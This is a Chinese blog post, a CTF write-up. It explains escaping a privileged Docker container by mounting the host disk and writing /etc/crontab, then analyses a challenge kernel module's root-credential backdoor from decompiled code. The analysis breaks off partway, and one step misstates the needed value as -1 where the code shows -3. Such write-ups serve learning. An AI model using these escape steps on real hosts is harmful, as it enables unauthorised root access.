@@ -1,0 +1,702 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fox.jpg">
+  <link rel="icon" href="/img/fox.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="数字云是第一次线下打real world模式,题目质量很高,深感自己所学知识的匮乏,因此特地学习了一波docker相关的知识,其实题目很简单,都怪自己太菜了走入了死胡同  docker在特权模式下启动的逃逸开启–privileged 的情况下(或者使用—cap-add&#x3D;SYSADMIN参数启动时)我们知道在版本6.0以后docker引入了特权模式 特权模式下允许容器内的root几乎拥有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="play_with_docker">
+<meta property="og:url" content="https://nightrainy.github.io/2019/10/31/play-with-docker/index.html">
+<meta property="og:site_name" content="知世の小屋">
+<meta property="og:description" content="数字云是第一次线下打real world模式,题目质量很高,深感自己所学知识的匮乏,因此特地学习了一波docker相关的知识,其实题目很简单,都怪自己太菜了走入了死胡同  docker在特权模式下启动的逃逸开启–privileged 的情况下(或者使用—cap-add&#x3D;SYSADMIN参数启动时)我们知道在版本6.0以后docker引入了特权模式 特权模式下允许容器内的root几乎拥有">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-10-31T05:59:18.000Z">
+<meta property="article:modified_time" content="2019-10-31T15:17:44.000Z">
+<meta property="article:author" content="知世">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>play_with_docker - 知世の小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>知世</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rick.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="play_with_docker"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-10-31 13:59" pubdate>
+          2019年10月31日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">play_with_docker</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>数字云是第一次线下打real world模式,题目质量很高,深感自己所学知识的匮乏,因此特地学习了一波docker相关的知识,其实题目很简单,都怪自己太菜了走入了死胡同</p>
+</blockquote>
+<h1 id="docker在特权模式下启动的逃逸"><a href="#docker在特权模式下启动的逃逸" class="headerlink" title="docker在特权模式下启动的逃逸"></a>docker在特权模式下启动的逃逸</h1><h2 id="开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时"><a href="#开启–privileged-的情况下-或者使用—cap-add-SYSADMIN参数启动时" class="headerlink" title="开启–privileged 的情况下(或者使用—cap-add&#x3D;SYSADMIN参数启动时)"></a>开启–privileged 的情况下(或者使用—cap-add&#x3D;SYSADMIN参数启动时)</h2><p>我们知道在版本6.0以后docker引入了特权模式</p>
+<p>特权模式下允许容器内的root几乎拥有外部物理机的root级别权限，而在此之前容器内root用户仅拥有外部物理机普通用户权限。</p>
+<p>因此,在开启了privileged的时候,我们就可以通过mount命令将外部宿主的磁盘挂载在容器内部,此时也就获得了宿主机的读写权限</p>
+<p>比如我们以特权模式开启一个docker,此时利用 <em>fdisk -l</em> 命令来查看磁盘文件:</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@ed1221982ba0:~<span class="hljs-comment"># fdisk -l</span><br>Disk /dev/sda:<span class="hljs-number"> 20 </span>GiB,<span class="hljs-number"> 21474836480 </span>bytes,<span class="hljs-number"> 41943040 </span>sectors<br>Units: sectors of<span class="hljs-number"> 1 </span>*<span class="hljs-number"> 512 </span>=<span class="hljs-number"> 512 </span>bytes<br>Sector size (logical/physical):<span class="hljs-number"> 512 </span>bytes /<span class="hljs-number"> 512 </span>bytes<br>I/O size (minimum/optimal):<span class="hljs-number"> 512 </span>bytes /<span class="hljs-number"> 512 </span>bytes<br>Disklabel type: dos<br>Disk identifier: 0x6e32e1c3<br><br>Device     Boot Start      End  Sectors Size Id Type<br>/dev/sda1  *    <span class="hljs-number"> 2048 </span>41940991<span class="hljs-number"> 41938944 </span> 20G<span class="hljs-number"> 83 </span>Linux<br><br></code></pre></td></tr></table></figure>
+<p>此时我们就可以把sda1挂载到我们的容器内</p>
+<ol>
+<li>mkdir &#x2F;xyz</li>
+<li>mount &#x2F;dev&#x2F;sda1 &#x2F;xyz</li>
+</ol>
+<p>此时我们访问&#x2F;xyz就可以访问到宿主机了,并且是拥有读写权限的,执行命令我们也可以通过写入 <em>&#x2F;etc&#x2F;crontab</em> 文件来执行命令(比如弹计算器QAQ)</p>
+<h1 id="数字云线下docker解法"><a href="#数字云线下docker解法" class="headerlink" title="数字云线下docker解法"></a>数字云线下docker解法</h1><p>线下的时候里一血和做不出来差了一个字符,导致这篇文章咕咕咕了很久</p>
+<p>题目要求是ssh上宿主机起的docker,然后在宿主机弹出计算器即可,给了宿主机启动docker前的的两行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> insmod /home/b/de.ko<br><span class="hljs-built_in">sudo</span> docker run -itd --privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c <span class="hljs-string">&quot;/etc/init.d/ssh start;/bin/bash&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>一种取巧的做法就是上面描述的使用特权方法,也是我线下时采用的(当时其实应该是成功了,但是环境崩了一度让我以为是我没做对</p>
+<p>尝试过的做法,</p>
+<ol>
+<li>直接弹计算器</li>
+<li>bash反弹shell<br>这两种当时都未成功,第一种是忘了环境变量display(弹GUI程序需要)<br>第二种为什么失败就很迷了,但是有师傅用python反弹shell成功了,可能是运气不好吧2333</li>
+</ol>
+<p>这里就使用这道题的正规解法来做吧</p>
+<p>题目首先挂载了de.ko文件,然后启动了docker,那么肯定是ko文件的问题,我们拉进IDA中对文件进行分析</p>
+<h2 id="init-moudle"><a href="#init-moudle" class="headerlink" title="init_moudle"></a>init_moudle</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">__int64 init_module()<br>&#123;<br>  __int64 <span class="hljs-built_in">v0</span><span class="hljs-comment">; // rdi</span><br>  __int64 <span class="hljs-built_in">v1</span><span class="hljs-comment">; // rax</span><br><br>  _fentry__();<br>  <span class="hljs-built_in">v0</span> = kmalloc_caches[<span class="hljs-number">4</span>];<br>  *(&amp;note + <span class="hljs-number">0x100000000</span>LL) = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">v1</span> = kmem_cache_alloc_trace(<span class="hljs-built_in">v0</span>, <span class="hljs-number">20971712</span>LL, <span class="hljs-number">10</span>LL);<br>  *(_BYTE *)(<span class="hljs-built_in">v1</span> + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span>;<br>  hack = <span class="hljs-built_in">v1</span>;<br>  proc_create_data(<span class="hljs-string">&quot;de&quot;</span>, <span class="hljs-number">438</span>LL, <span class="hljs-number">0</span>LL, &amp;de_proc, <span class="hljs-number">0</span>LL);<br>  printk(<span class="hljs-string">&quot;/proc/de created\n&quot;</span>, <span class="hljs-number">438</span>LL);<br>  printk(<span class="hljs-string">&quot;size of cred : %ld \n&quot;</span>, <span class="hljs-number">168</span>LL);<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="copy-overflow"><a href="#copy-overflow" class="headerlink" title="copy_overflow"></a>copy_overflow</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">void __fastcall __noreturn copy_overflow(unsigned int <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>&#123;<br>  _warn_printk(<span class="hljs-string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>);<br>  <span class="hljs-keyword">BUG();</span><br><span class="hljs-keyword"></span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="de-write"><a href="#de-write" class="headerlink" title="de_write"></a>de_write</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __usercall de_write@&lt;rax&gt;(__int64 a1@&lt;rbx&gt;, __int64 a2@&lt;rbp&gt;, char *a3@&lt;rsi&gt;, __int64 a4@&lt;r12&gt;, __int64 a5@&lt;r13&gt;, __int64 a6@&lt;r14&gt;)<br>&#123;<br>  char *v6; // rbx<br>  __int64 v7; // rdx<br>  __int64 v8; // r12<br>  __int64 v9; // rsi<br>  char v10; // al<br>  __int64 v11; // rax<br>  __int64 v12; // rsi<br>  __int64 v14; // rax<br>  unsigned<span class="hljs-built_in"> int </span>v15; // eax<br>  __int64 v16; // r13<br>  __int64 v17; // r13<br> <span class="hljs-built_in"> const </span>char *v18; // [rsp-40h] [rbp-40h]<br>  __int64 v19; // [rsp-38h] [rbp-38h]<br>  unsigned __int64 v20; // [rsp-30h] [rbp-30h]<br>  __int64 v21; // [rsp-28h] [rbp-28h]<br>  __int64 v22; // [rsp-20h] [rbp-20h]<br>  __int64 v23; // [rsp-18h] [rbp-18h]<br>  __int64 v24; // [rsp-10h] [rbp-10h]<br>  __int64 v25; // [rsp-8h] [rbp-8h]<br><br>  _fentry__();<br>  v25 = a2;<br>  v24 = a6;<br>  v23 = a5;<br>  v22 = a4;<br>  v21 = a1;<br>  v6 = a3;<br>  v8 = v7;<br>  v20 = __readgsqword(0x28u);<br>  mutex_lock(&amp;lock);<br>  v9 = (unsigned __int8)*a3;<br>  printk(<span class="hljs-string">&quot;order:%d&quot;</span>, v9);<br>  v10 = *v6;<br> <span class="hljs-built_in"> if </span>( *v6 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( v10 == -1 )<br>    &#123;<br>      printk(<span class="hljs-string">&quot;note write\n&quot;</span>, v9);<br>      v17 = *((_QWORD *)&amp;note + 1);<br>      _check_object_size(*((_QWORD *)&amp;note + 1), v8 - 1, 0<span class="hljs-class">LL);</span><br>      copy_from_user(v17, v6 + 1, v8 - 1);<br>      printk(<span class="hljs-string">&quot;write contents compelete\n&quot;</span>, v6 + 1);<br>    &#125;<br>    else<span class="hljs-built_in"> if </span>( v10 == -2 )<br>    &#123;<br>      printk(<span class="hljs-string">&quot;note write magic %ld\n&quot;</span>, v8);<br>      v16 = hack;<br>      _check_object_size(hack, v8 - 1, 0<span class="hljs-class">LL);</span><br>      copy_from_user(v16, v6 + 1, v8 - 1);<br>    &#125;<br>    else<span class="hljs-built_in"> if </span>( v10 != -3 || *(_BYTE *)(hack + 8) )<br>    &#123;<br>      printk(<span class="hljs-string">&quot;note malloc\n&quot;</span>, v9);<br>      note = *v6;<br>      printk(<span class="hljs-string">&quot;write size compelete\n&quot;</span>, v9);<br>      v11 = _kmalloc((unsigned __int8)note, 20971712<span class="hljs-class">LL);</span><br>      v12 = (unsigned __int8)note;<br>      *((_QWORD *)&amp;note + 1) = v11;<br>      printk(<span class="hljs-string">&quot;malloc size compelete:%d @ %p\n&quot;</span>, v12);<br>    &#125;<br>    else<br>    &#123;<br>      v14 = prepare_kernel_cred(0<span class="hljs-class">LL);</span><br>      commit_creds(v14);<br>      v18 = <span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span>;<br>      v19 = 0<span class="hljs-class">LL;</span><br>      v15 = call_usermodehelper(<span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span>, &amp;v18, envp_26376, 1<span class="hljs-class">LL);</span><br>      printk(<span class="hljs-string">&quot;RC is: %i \n&quot;</span>, v15);<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    printk(<span class="hljs-string">&quot;note free\n&quot;</span>, v9);<br>    kfree(*((_QWORD *)&amp;note + 1));<br>  &#125;<br>  mutex_unlock(&amp;lock);<br> <span class="hljs-built_in"> return </span>v8;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="de-read"><a href="#de-read" class="headerlink" title="de_read"></a>de_read</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sqf">unsigned <span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> de_read(<span class="hljs-variable">__int64</span> a1, <span class="hljs-variable">__int64</span> a2)<br>&#123;<br>  unsigned <span class="hljs-variable">__int64</span> v2; <span class="hljs-comment">// rdx</span><br>  unsigned <span class="hljs-variable">__int64</span> v3; <span class="hljs-comment">// r12</span><br>  unsigned <span class="hljs-variable">__int64</span> v4; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-variable">__int64</span> v5; <span class="hljs-comment">// r12</span><br><br>  <span class="hljs-variable">_fentry__</span>();<br>  v3 = v2;<br>  mutex_lock(&amp;<span class="hljs-built_in">lock</span>);<br>  printk(<span class="hljs-string">&quot;/proc/de read\n&quot;</span>, a2);<br>  v4 = (unsigned <span class="hljs-variable">__int8</span>)note;<br>  <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-variable">__int8</span>)note &gt; v3 )<br>    v4 = v3;<br>  v5 = *((<span class="hljs-variable">_QWORD</span> *)&amp;note + <span class="hljs-number">1</span>);<br>  <span class="hljs-variable">_check_object_size</span>(*((<span class="hljs-variable">_QWORD</span> *)&amp;note + <span class="hljs-number">1</span>), v4, <span class="hljs-number">1</span>LL);<br>  copy_to_user(a2, v5, v4);<br>  mutex_unlock(&amp;<span class="hljs-built_in">lock</span>);<br>  return v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到我们只需要紧盯de_write函数即可,我们只需要让程序跳转到这里就可以调用后门来弹出计算器了</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lisp">v14 = prepare_kernel_cred(<span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>commit_creds(<span class="hljs-name">v14</span>)<span class="hljs-comment">;</span><br>v18 = <span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span><span class="hljs-comment">;</span><br>v19 = <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>v15 = call_usermodehelper(<span class="hljs-string">&quot;/usr/bin/gnome-calculator&quot;</span>, <span class="hljs-symbol">&amp;v18</span>, envp_26376, <span class="hljs-number">1</span>LL)<span class="hljs-comment">;</span><br>printk(<span class="hljs-string">&quot;RC is: %i \n&quot;</span>, v15)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>我们知道在内核中想要获得root权限不能只是用system(“&#x2F;bin&#x2F;sh”);而是用下面的语句：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">commit_creds(<span class="hljs-name">prepare_kernel_cred</span> (<span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>这个函数分配并应用了一个新的凭证结构（uid &#x3D; 0, gid &#x3D; 0）从而获取root权限来执行命令</p>
+<p>那么我们该如何跳转到这里呢?<br>我们可以看到de_write的定义如下:</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">_int64 __usercall <span class="hljs-symbol">de_write@<span class="hljs-keyword">&lt;rax&gt;</span></span>(__int64 <span class="hljs-symbol">a1@<span class="hljs-keyword">&lt;rbx&gt;</span></span>, __int64 <span class="hljs-symbol">a2@<span class="hljs-keyword">&lt;rbp&gt;</span></span>, char *<span class="hljs-symbol">a3@<span class="hljs-keyword">&lt;rsi&gt;</span></span>, __int64 <span class="hljs-symbol">a4@<span class="hljs-keyword">&lt;r12&gt;</span></span>, __int64 <span class="hljs-symbol">a5@<span class="hljs-keyword">&lt;r13&gt;</span></span>, __int64 <span class="hljs-symbol">a6@<span class="hljs-keyword">&lt;r14&gt;</span></span>)<br></code></pre></td></tr></table></figure>
+<p>而正常情况下write函数的定义为:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> filedes, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes)</span></span>;<br></code></pre></td></tr></table></figure>
+<p>因此我们不难猜到a3应该就是我们所传入的buf<br>而我们所关注的只有v6,也就是a3<br>后面做了一个赋值操作,即</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v10</span> <span class="hljs-operator">=</span> *v6<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>首先传入所写值v6,如果v6有值就进行下面的判断,首先如果v10&#x3D;&#x3D;-1,那么</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">printk</span>(<span class="hljs-string">&quot;note write\n&quot;</span>, v9);<br><span class="hljs-attribute">v17</span> = *((_QWORD *)&amp;note + <span class="hljs-number">1</span>);<br><span class="hljs-attribute">_check_object_size</span>(*((_QWORD *)&amp;note + <span class="hljs-number">1</span>), v8 - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL);<br><span class="hljs-attribute">copy_from_user</span>(v17, v6 + <span class="hljs-number">1</span>, v8 - <span class="hljs-number">1</span>);<br><span class="hljs-attribute">printk</span>(<span class="hljs-string">&quot;write contents compelete\n&quot;</span>, v6 + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+<p>而如果是-2,那么</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">printk(<span class="hljs-string">&quot;note write magic %ld\n&quot;</span>, v8);<br>v16 = hack;<br>_check_object_size(hack, v8 - 1, 0<span class="hljs-class">LL);</span><br>copy_from_user(v16, v6 + 1, v8 - 1);<br></code></pre></td></tr></table></figure>
+<p>如果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v10</span> != -<span class="hljs-number">3</span> || *(_BYTE *)(hack + <span class="hljs-number">8</span>) <br></code></pre></td></tr></table></figure>
+<p>就运行</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">printk(<span class="hljs-string">&quot;note malloc\n&quot;</span>, v9);<br><span class="hljs-literal">note</span> = *v6;<br>printk(<span class="hljs-string">&quot;write size compelete\n&quot;</span>, v9);<br>v11 = _kmalloc((<span class="hljs-built_in">unsigned</span> __int8)<span class="hljs-literal">note</span>, <span class="hljs-number">20971712</span>LL);<br>v12 = (<span class="hljs-built_in">unsigned</span> __int8)<span class="hljs-literal">note</span>;<br>*((_QWORD *)&amp;<span class="hljs-literal">note</span> + <span class="hljs-number">1</span>) = v11;<br>printk(<span class="hljs-string">&quot;malloc size compelete:%d @ %p\n&quot;</span>, v12);<br></code></pre></td></tr></table></figure>
+<p>否则才能跳转到我们所需要的逻辑上,而这个hack变量在bss段上,因此我们需要让v10&#x3D;-1并且</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-emphasis">*(_BYTE *</span>)(hack+8)==0<br></code></pre></td></tr></table></figure>
+<p>迷惑行为2333</p>
+<p>其实这里我们直接看汇编部分会更加清楚</p>
